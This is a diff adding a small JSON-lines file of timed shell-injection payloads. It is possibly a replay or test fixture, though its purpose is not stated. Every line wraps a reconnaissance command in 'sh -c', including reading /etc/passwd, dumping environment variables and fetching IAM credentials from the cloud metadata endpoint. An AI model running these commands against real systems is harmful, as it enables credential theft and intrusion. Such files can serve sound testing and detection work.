@@ -1,0 +1,8 @@
+{"t": 0, "payload": "sh -c id"}
+{"t": 4, "payload": "sh -c uname -a"}
+{"t": 9, "payload": "sh -c cat /etc/passwd"}
+{"t": 15, "payload": "sh -c ls -la /var/www"}
+{"t": 21, "payload": "sh -c env"}
+{"t": 28, "payload": "sh -c curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+{"t": 35, "payload": "sh -c ps aux"}
+{"t": 41, "payload": "sh -c netstat -tlnp"}
